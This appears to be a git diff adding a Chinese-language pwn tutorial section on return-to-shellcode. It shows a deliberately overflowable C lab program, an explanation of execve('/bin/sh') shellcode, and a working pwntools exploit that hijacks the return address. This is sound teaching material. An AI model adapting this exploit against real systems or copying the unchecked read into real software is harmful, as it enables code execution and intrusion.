@@ -116,7 +116,87 @@ strlen 精准bypass，但是没必要。直接全传`\x00`不香🐴  ，都不�
 
 ### Lab3
 
-123123
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+char message[48];
+
+int main()
+{
+  char name[16];
+  printf("Give me your message: ");
+  fflush(stdout);
+  read(0, message, 0x30);
+  printf("Give me your name: ");
+  fflush(stdout);
+  read(0, name, 0x30);
+  return 0;
+}
+```
+
+![image-20211228211845743](/assets/img/2022/image-20211228211845743.png)
+
+> https://siriushsh.github.io/posts/Pwn%E5%85%A5%E9%97%A81-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#return-to-shellcode
+>
+> 没有开NX，所以可以向message中写入shellcode，并且在第15行控制程序执行流跳转到message处，执行shellcode
+
+由于没有开PIE，所以程序运行时message所在的地址是不变的，可以通过如下图方式查看验证一波：
+
+![image-20211228214000710](/assets/img/2022/image-20211228214000710.png)
+
+简单的利用，shellcode就如下图所示，只要把rdi, rsi, rdx设置好，rax设为0x3b，最后调用syscall
+
+https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md ,这个网站可以查syscall table
+
+![image-20211228221733106](/assets/img/2022/image-20211228221733106.png)
+
+![image-20211228221721048](/assets/img/2022/image-20211228221721048.png)
+
+![image-20211228221554081](/assets/img/2022/image-20211228221554081.png)
+
+> ![image-20211228223709889](/assets/img/2022/image-20211228223709889.png){: .normal}
+>
+> 0x68732f6e69622f这个数字就是"/bin/sh"的小端序表示，放进内存后计算机读取时就是/bin/sh，这个数字可以这么获得：
+>
+> ![image-20211228223842892](/assets/img/2022/image-20211228223842892.png){: .normal}
+
+![image-20211228221521394](/assets/img/2022/image-20211228221521394.png)
+
+或者直接调用pwntools的shellcraft模块
+
+![image-20211228222835433](/assets/img/2022/image-20211228222835433.png)
+
+exp:
+
+```python
+from pwn import *
+
+
+r = process("./ret2sc")
+context(arch='amd64', os='linux')
+
+r.recvuntil("message:")
+
+# sc = """
+# mov rbx, 0x68732f6e69622f
+# push rbx
+# mov rdi, rsp
+# xor rsi, rsi
+# xor rdx, rdx
+# mov rax, 0x3b
+# syscall
+# """
+# sc = asm(sc, arch="amd64")
+r.send(asm(shellcraft.sh()))
+
+r.recvuntil("name:")
+p = "a"*0x18 + p64(0x601060)
+r.send(p)
+
+r.interactive()
+```
 
 ## 0x03 GOT Hijacking
 
